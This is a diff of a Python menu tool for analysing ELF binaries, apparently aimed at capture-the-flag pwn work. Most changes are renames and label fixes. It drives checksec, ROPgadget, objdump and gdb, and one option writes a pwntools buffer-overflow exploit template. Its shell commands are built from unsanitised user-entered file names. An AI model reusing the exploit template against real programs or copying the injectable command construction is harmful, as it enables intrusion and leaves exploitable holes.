 # -------------------------------------------------------------------------------------      
       
    if selection =='2':
       BAK = RBX
-      RBX = input("[?] Please enter base value: ")
+      RBX = input("[?] Please enter base address: ")
       if RBX != "":
          RBX = spacePadding(RBX,COL1)
       else:
@@ -675,14 +688,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RCX VALUE
+# Version : ELF MASTER
+# Details : Menu option selected - Set RCX value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='3':
       BAK = RCX
-      RCX = input("[?] Please enter counter value: ")
+      RCX = input("[?] Please enter counter address: ")
       if RCX != "":
          RCX = spacePadding(RCX,COL1)
       else:
@@ -692,14 +705,14 @@ while True:
  # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RDX VALUE
+# Version : ELF MASTER
+# Details : Menu option selected - Set RDX value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='4':
       BAK = RDX
-      RDX = input("[?] Please enter data value: ")
+      RDX = input("[?] Please enter data address: ")
       if RDX != "":
          RDX = spacePadding(RDX,COL1)
       else:
@@ -709,14 +722,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RSI VALUE
+# Version : ELF MASTER
+# Details : Menu option selected - Set RSI value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='5':
       BAK = RSI
-      RSI = input("[?] Please enter source value: ")
+      RSI = input("[?] Please enter source address: ")
       if RSI != "":
          RSI = spacePadding(RSI,COL1)
       else:
@@ -726,14 +739,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RDI VALUE
+# Version : ELF MASTER
+# Details : Menu option selected - Set RDI value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='6':
       BAK = RDI
-      RDI = input("[?] Please enter destination value: ")
+      RDI = input("[?] Please enter destination address: ")
       if RDI != "":
          RDI = spacePadding(RDI,COL1)
       else:
@@ -743,14 +756,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RSP VALUE
+# Version : ELF MASTER
+# Details : Menu option selected - Set RSP value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='7':
       BAK = RSP
-      RSP = input("[?] Please enter stack pointer value: ")
+      RSP = input("[?] Please enter stack pointer address: ")
       if RSP != "":
          RSP = spacePadding(RSP,COL1)
       else:
@@ -760,14 +773,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RBP VALUE 
+# Version : ELF MASTER
+# Details : Menu option selected - Set RBP value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='8':
       BAK = RBP
-      RBP = input("[?] Please enter base pointer value: ")
+      RBP = input("[?] Please enter base pointer address: ")
       if RBP != "":
          RBP = spacePadding(RBP,COL1)
       else:
@@ -777,31 +790,31 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Instruction Pointer.
+# Version : ELF MASTER
+# Details : Menu option selected - Set RIP Value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='9':
-      BAK = INS
-      INS = input("[?] Please enter extended instruction pointer value: ")
-      if INS != "":
-         INS = spacePadding(INS,COL1)
+      BAK = INSP
+      INSP = input("[?] Please enter extended instruction pointer address: ")
+      if INSP != "":
+         INSP = spacePadding(INSP,COL1)
       else:
-            INS = BAK
+            INSP = BAK
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Start value
+# Version : ELF MASTER
+# Details : Menu option selected - Set START address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='10':
       BAK = SRT
-      SRT = input("[?] Please enter start value: ")
+      SRT = input("[?] Please enter start address: ")
       if SRT != "":
          SRT = spacePadding(SRT,COL1)
       else:
@@ -811,7 +824,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Set MAIN address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
@@ -828,8 +841,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Custom address two.
+# Version : ELF MASTER
+# Details : Menu option selected - Set custom address one.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -845,8 +858,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Custom address one.
+# Version : ELF MASTER
+# Details : Menu option selected - Set custom address two.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -862,21 +875,18 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - 
-# Details : Menu option selected - Name fileName.
+# Version : ELF MASTER
+# Details : Menu option selected - Set file name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
       print(colored("[*] Scanning files in " + localDir + " directory...", colour3))
       command("ls -la " + localDir + " > dir.tmp")
-      command("sed -i '1d' ./dir.tmp")
-      command("sed -i '1d' ./dir.tmp")
-      command("sed -i '1d' ./dir.tmp")
+      for loop in range(3):
+         command("sed -i '1d' ./dir.tmp")
       command("sed -i '/RA.db/d' ./dir.tmp")
-      count = lineCount("dir.tmp")
-        
+      count = lineCount("dir.tmp")        
       if count < 1:
          print("[-] The directory is empty...")
       else:
@@ -884,10 +894,10 @@ while True:
          BAK = FIL
          FIL = input("[?] Please enter filename: ")
          if FIL != "":
-            FIL = spacePadding(FIL,COL0)
+            FIL = spacePadding(FIL,COL1)
             if os.path.exists(localDir + "/" + FIL.rstrip(" ")):
                command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
-               MODE = "Static "
+               MODE = spacePadding("Static", COL1)
             else:
                print("[-] I could not find the file name you entered, did you spell it correctly?...")
                FIL = BAK
@@ -898,8 +908,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - chmod +x fileMame.
+# Version : ELF MASTER
+# Details : Menu option selected - Chmod -x file name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -909,14 +919,14 @@ while True:
       else:
          print(colored("[*] Filename " + localDir + "/" + FIL.rstrip(" ") + " is now NOT executable...", colour3))
          command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
-         MODE = "Static "
+         MODE = spacePadding("Static", COL1)
       prompt()                              
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - chmod +x fileMame.
+# Version : ELF MASTER
+# Details : Menu option selected - Chmod +x file name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -926,14 +936,14 @@ while True:
       else:
          print(colored("[*] Filename " + localDir + "/" + FIL.rstrip(" ") + " is now executable...", colour3))
          command("chmod +x " + localDir + "/" + FIL.rstrip(" "))
-         MODE = "Dynamic"
+         MODE = spacePadding("Dynamic", COL1)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Change remote IP address.
+# Version : ELF MASTER
+# Details : Menu option selected - Gather data from file name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -949,21 +959,21 @@ while True:
             COM = spacePadding("ELF", COL1)
             print("Linux binary file...")         
          if "8-bit" in binary:
-            BIT = "08-Bit"
-            print(BIT + " architecture...")           
-            BIT = spacePadding(BIT, COL1)            
+            BITS = "08-Bit"
+            print(BITS + " architecture...")           
+            BITS = spacePadding(BITS, COL1)            
          if "16-bit" in binary:
-            BIT = "16-Bit"
-            print(BIT + " architecture...")           
-            BIT = spacePadding(BIT, COL1)            
+            BITS = "16-Bit"
+            print(BITS + " architecture...")           
+            BITS = spacePadding(BITS, COL1)            
          if "32-bit" in binary:
-            BIT = "32-Bit"
-            print(BIT + " architecture...")           
-            BIT = spacePadding(BIT, COL1)         
+            BITS = "32-Bit"
+            print(BITS + " architecture...")           
+            BITS = spacePadding(BITS, COL1)         
          if "64-bit" in binary:
-            BIT = "64-Bit"
-            print(BIT + " architecture...")  
-            BIT = spacePadding(BIT, COL1)         
+            BITS = "64-Bit"
+            print(BITS + " architecture...")  
+            BITS = spacePadding(BITS, COL1)         
          if "LSB" in binary:
             IND = "Little"
             print(IND + " indian...")
@@ -985,8 +995,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Checksec fileName.
+# Version : ELF MASTER
+# Details : Menu option selected - Checksec file name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -997,16 +1007,13 @@ while True:
          print(colored("[*] Examining filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("checksec " + localDir + "/" + FIL.rstrip(" ") + " 2> checksec.tmp")
          parsFile("checksec.tmp")
-         catsFile("checksec.tmp")
-         
+         catsFile("checksec.tmp")         
          print("If RELRO is set to full, then the entire GOT is read-only which removes the ability to perform a 'GOT overwrite' attack...")
          print("If CANARY is found, then the program checks to see if the stack has been smashed...")
          print("If FORTIFY is enabled, then the program checks for buffer overflow...")
          print("If NX is enabled, then the stack is read-only and you will need to use return-oriented programming.")
          print("If PIE is enabled, then the programs memory locations will not stay the same hence you need to leak addresses to find offsets...")
-         print("If RWX has segments, then these are writeable and executable at the same time...")
-         
-         colourx = "green"
+         print("If RWX has segments, then these are writeable and executable at the same time...")         
          count = lineCount("checksec.tmp") 
          for x in range(0, count):
             binary = linecache.getline("checksec.tmp", x+1)
@@ -1015,24 +1022,19 @@ while True:
             if "Full RELRO" in binary:
                RE = "RELRO    Full     " 
             if "Partial RELRO" in binary:
-               RE = "RELRO    Partial  "
-               
+               RE = "RELRO    Partial  "               
             if "No canary found" in binary:
-               ST = "STACK    No Canary"   
-                           
+               ST = "STACK    No Canary"                           
             if "No Fortify" in binary:
-               FO = "Fortify  Disabled " 
-                             
+               FO = "Fortify  Disabled "                              
             if "NX disabled" in binary:
                NX = "NX       Disabled "
             if "NX enabled" in binary:
-               NX = "NX       Enabled  "   
-                           
+               NX = "NX       Enabled  "                           
             if "No PIE" in binary:
                PI = "PIE      No PIE   "               
             if "PIE enabled" in binary:
-               PI = "PIE      Enabled  "      
-                       
+               PI = "PIE      Enabled  "                       
             if "No RWX segments" in binary:
                RW = "RWX     NoSegments"
             if "Has RWX segments" in binary:
@@ -1042,8 +1044,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - ObjDUmp
+# Version : ELF MASTER
+# Details : Menu option selected - Create functions file.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1059,17 +1061,17 @@ while True:
          funcNum = lineCount("functions.tmp")
          funcNum = spacePadding(str(funcNum),7)
          with open("functions.tmp", "r") as functions:
-            for x in range(0, maxDisp):
-               ADDR[x] = functions.readline().rstrip(" ")
-               ADDR[x] = spacePadding(ADDR[x], COL2)
+            for x in range(0, maxDispl):
+               FUNC[x] = functions.readline().rstrip(" ")
+               FUNC[x] = spacePadding(FUNC[x], COL2)
          command("mv functions.tmp " + localDir + "/functions.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Gadgets
+# Version : ELF MASTER
+# Details : Menu option selected - Create gadgets file.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1080,15 +1082,15 @@ while True:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("ROPgadget --binary " + localDir + "/" + FIL.rstrip(" ") + " > gadgets.tmp")
          parsFile("gadgets.tmp")
-         catsFile("gadgets.tmp")         
-         command("sed -i '1d' gadgets.tmp")
-         command("sed -i '1d' gadgets.tmp")     
+         catsFile("gadgets.tmp")        
+         for i in range(2):
+            command("sed -i '1d' gadgets.tmp")
          command("sed -i 's/://g' gadgets.tmp")
-         command("sed -i '/Unique gadgets/d' gadgets.tmp")
+         cutLine("Unique gadgets","gadgets.tmp")
          gadgNum = lineCount("gadgets.tmp")
          gadgNum = spacePadding(str(gadgNum),7)
          with open("gadgets.tmp","r") as gadgets:
-            for x in range (0, maxDisp):
+            for x in range (0, maxDispl):
                GADD[x] = gadgets.readline().rstrip(" ")
                GADD[x] = spacePadding(GADD[x], COL3)
          command("mv gadgets.tmp " + localDir + "/gadgets.txt")
@@ -1097,8 +1099,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - File headers.
+# Version : ELF MASTER
+# Details : Menu option selected - Display file header.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1160,8 +1162,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Object headers.
+# Version : ELF MASTER
+# Details : Menu option selected - Display object headers.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1177,8 +1179,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Section headers.
+# Version : ELF MASTER
+# Details : Menu option selected - Display section headers.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1188,14 +1190,15 @@ while True:
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("objdump" + " -h " + localDir + "/" + FIL.rstrip(" ") + " > sections.tmp")
+         parsFile("sections.tmp")
          catsFile("sections.tmp")
       prompt() 
    
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - All Headers.
+# Version : ELF MASTER
+# Details : Menu option selected - Display all Headers.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1205,14 +1208,15 @@ while True:
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("objdump" + " -x " + localDir + "/" + FIL.rstrip(" ") + "> all.tmp")
+         parsFile("all.tmp")
          catsFile("all.tmp")
       prompt() 
    
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Executable section
+# Version : ELF MASTER
+# Details : Menu option selected - Display executable section
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1222,17 +1226,19 @@ while True:
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("objdump" + " -d " + localDir + "/" + FIL.rstrip(" ") + " > exec.tmp")
+         parsFile("exec.tmp")
          catsFile("exec.tmp")
          command("cat exec.tmp | grep ' <main>' > main.tmp ")
          with open("main.tmp","r") as main:
             MAIN = spacePadding("0x" + main.readline().split(" ")[0], COL1)
+            print("[+] Adding MAIN address to registers...")
       prompt() 
    
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Debug information.
+# Version : ELF MASTER
+# Details : Menu option selected - Display debug information.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1242,14 +1248,15 @@ while True:
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("objdump" + " -g " + localDir + "/" + FIL.rstrip(" ") + " > debug.tmp")
+         parsFile("debug.tmp")
          catsFile("debug.tmp")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Debug + code intermix
+# Version : ELF MASTER
+# Details : Menu option selected - Display debug + code intermix.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1259,14 +1266,15 @@ while True:
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("objdump" + " -D -S " + localDir + "/" + FIL.rstrip(" ") + " > code.tmp")
+         parsFile("code.tmp")
          catsFile("code.tmp")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Symbols
+# Version : ELF MASTER
+# Details : Menu option selected - Display symbols
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1276,14 +1284,15 @@ while True:
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("objdump" + " -t " + localDir + "/" + FIL.rstrip(" ") + " > symbols.tmp")
+         parsFile("symbols.tmp")
          catsFile("symbols.tmp")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Stabs
+# Version : ELF MASTER
+# Details : Menu option selected - Display stabs.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1292,15 +1301,16 @@ while True:
          print("[-] Filename not specified...")
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
-         command("objdump" + " -G " + localDir + "/" + FIL.rstrip(" ") + " > symbols.tmp")
-         catsFile("symbols.tmp")
+         command("objdump" + " -G " + localDir + "/" + FIL.rstrip(" ") + " > stabs.tmp")
+         parsFile("stabs.tmp")
+         catsFile("stabs.tmp")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Hexform
+# Version : ELF MASTER
+# Details : Menu option selected - Display in hex form.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1309,14 +1319,15 @@ while True:
          print("[-] Filename not specified...")
       else:
          print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
-         command("objdump" + " -s " + localDir + "/" + FIL.rstrip(" ") + " > symbols.tmp")
-         catsFile("symbols.tmp")
+         command("objdump" + " -s " + localDir + "/" + FIL.rstrip(" ") + " > hex.tmp")
+         parsFile("hex.tmp")
+         catsFile("hex.tmp")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - MSF pattern create.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1337,8 +1348,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Run fileName.
+# Version : ELF MASTER
+# Details : Menu option selected - Run file name using ltrace.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1353,8 +1364,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - gdb fileName
+# Version : ELF MASTER
+# Details : Menu option selected - gdb file name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1363,7 +1374,7 @@ while True:
          print("[-] Filename not specified...")
       else:
          print(colored("[*] Editing filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
-         command("echo 'set disassembly-flavor " + flavour + "' > command.tmp")
+         command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
          command("echo 'set follow-fork-mode child' >> command.tmp")
          command("gdb -q " + localDir + "/" + FIL.rstrip(" ") + " -x command.tmp")
       prompt()
@@ -1371,8 +1382,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - MSF patter finder
+# Version : ELF MASTER
+# Details : Menu option selected - MSF patter finder.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1392,8 +1403,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - OFFSET 
+# Version : ELF MASTER
+# Details : Menu option selected - Set OFFSET value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -1410,13 +1421,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Disassemble MAIN.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '36':
-      command("echo 'set disassembly-flavor " + flavour + "' > command.tmp")
+      command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
       command("echo 'set follow-fork-mode child' >> command.tmp")
       command("echo 'break main' >> command.tmp")
       command("echo 'run' >> command.tmp")
@@ -1428,15 +1439,15 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Disassemble main address.
+# Version : ELF MASTER
+# Details : Menu option selected - Disassemble address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '37':
       address = input("[?] Please enter address value: ")
       if address != "":
-         command("echo 'set disassembly-flavor " + flavour + "' > command.tmp")
+         command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
          command("echo 'set follow-fork-mode child' >> command.tmp")      
          command("echo 'break main' >> command.tmp")
          command("echo 'run' >> command.tmp")
@@ -1448,14 +1459,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Disassemble a function.
+# Version : ELF MASTER
+# Details : Menu option selected - Disassemble function.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
       function = input("[?] Please enter function name: ")
-      command("echo 'set disassembly-flavor " + flavour + "' > command.tmp")
+      command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
       command("echo 'set follow-fork-mode child' >> command.tmp")      
       command("echo 'break main' >> command.tmp")
       command("echo 'run' >> command.tmp")
@@ -1467,8 +1478,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - radare script
+# Version : ELF MASTER
+# Details : Menu option selected - Use radare script.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1486,12 +1497,13 @@ while True:
          with open("main.tmp","r") as address:
             MAIN = address.readline().split(" ")[0]
             MAIN = spacePadding(MAIN, COL1)
+            print("[+] Adding MAIN address to registers...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Find libc version.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1511,7 +1523,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Hex Editor.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1527,7 +1539,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Start ghidra.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1543,7 +1555,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Start Immunity Debugger.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1559,7 +1571,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Start nasm_shell.rb.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1575,7 +1587,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Generate shell code.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1596,7 +1608,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Generate exploit code.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1624,7 +1636,7 @@ while True:
          else:
             command("echo '#context.os = \"windows\"' >> " + localDir + "/exploit.py")
          command("echo '#context.arch = \"" + ARC.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
-         command("echo '#context.bits = \"" + BIT[:2] + "\"' >> " + localDir + "/exploit.py")
+         command("echo '#context.bits = \"" + BITS[:2] + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'try:' >> " + localDir + "/exploit.py")
@@ -1632,6 +1644,9 @@ while True:
          command("echo 'except:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
+        
+        # ADD OTHER REGISTER HERE!!
+        
          command("echo 'start = " + SRT.rstrip(" ") + "' >> " + localDir + "/exploit.py")
          command("echo 'main = " + MAIN.rstrip(" ") + "' >> " + localDir + "/exploit.py")
          command("echo 'cus1 = " + CUS1.rstrip(" ") + "' >> " + localDir + "/exploit.py")
@@ -1639,20 +1654,20 @@ while True:
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'buffers   = \"a\" * " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
          command("echo 'integer   = \"a\" * 4' >> " + localDir + "/exploit.py")
-         if BIT[:2] == "64":
+         if BITS[:2] == "64":
             command("echo 'pointer   = \"a\" * 8' >> "+ localDir + "/exploit.py")
          else:
             command("echo 'pointer   = \"a\" * 4' >> "+ localDir + "/exploit.py")         
          command("echo 'padding   = \"a\" * 4' >> "+ localDir + "/exploit.py")  
          command("echo 'overwrite = p64(cus1)' >> "+ localDir + "/exploit.py")  
-         command("echo 'term      = \"\ n\" #AMEND' >> "+ localDir + "/exploit.py")
+         command("echo 'term      = \"\ n\"' >> "+ localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'payload = flat(buffers,overwrite,term)' >> " + localDir + "/exploit.py")
          command("echo 'print(payload)' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 's.recvuntil(\"Enter your name :\")' >> " + localDir + "/exploit.py")
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
-         command("echo 's.recvuntil(\"Congratulations!\ n\") #AMEND' >> " + localDir + "/exploit.py")
+         command("echo 's.recvuntil(\"Congratulations!\ n\")'  >> " + localDir + "/exploit.py")
          command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
          command("echo 'success(flag)' >> " + localDir + "/exploit.py")
          command("echo 's.interactive()' >> " + localDir + "/exploit.py")
@@ -1663,8 +1678,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - set disassembly-flavor
+# Version : ELF MASTER
+# Details : Menu option selected - Set disassembly-flavor.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1674,24 +1689,23 @@ while True:
       if flavour == "":
          flavour = bak
